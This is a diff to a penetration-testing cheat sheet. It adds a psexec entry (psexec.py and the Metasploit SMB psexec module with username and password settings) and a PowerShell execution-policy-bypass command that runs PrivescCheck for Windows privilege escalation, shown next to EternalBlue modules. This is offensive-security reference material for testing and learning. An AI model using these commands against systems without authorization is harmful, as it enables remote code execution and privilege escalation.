@@ -471,6 +471,7 @@ set CMD <command>
   - [XODA 0.4.5](#XODA-045)
 - SMB/Samba
   - [EternalBlue](#EternalBlue)
+  - [psexec](#psexec)
   - [Samba smbd 3.X - 4.X](#Samba-smbd-3X---4X)
 - SMTP
   - [Haraka <2.8.9](#Haraka-289)
@@ -579,6 +580,18 @@ use auxiliary/scanner/smb/smb_ms17_010
 use exploit/windows/smb/ms17_010_eternalblue
 ```
 - SMBv1 only.
+
+### psexec
+[<< Index](#Index)
+```
+which psexec.py
+psexec.py <username>@<ip>
+```
+```
+use exploit/windows/smb/psexec
+set SMBUser <username>
+set SMBPass <password>
+```
 
 ### Samba smbd 3.X - 4.X
 [<< Index](#Index)
@@ -842,6 +855,7 @@ i686-w64-mingw32-gcc 9303.c -o exploit_32 -lws2_32
   - [Windows](#Windows)
   - [Linux](#Linux)
 - Privilege Escalation
+  - [PrivescCheck](#PrivescCheck)
   - [SUDO Privileges](#SUDO-Privileges)
   - [SUID Binaries](#SUID-Binaries)
   - [Token Impersonation](#Token-Impersonation)
@@ -1061,6 +1075,13 @@ chmod +x linenum.sh
 meterpreter > getsystem
 ```
 - https://docs.rapid7.com/metasploit/meterpreter-getsystem/
+
+### PrivescCheck
+[<< Index](#Index)
+```
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+```
+- https://github.com/itm4n/PrivescCheck
 
 ### SUDO Privileges
 [<< Index](#Index)
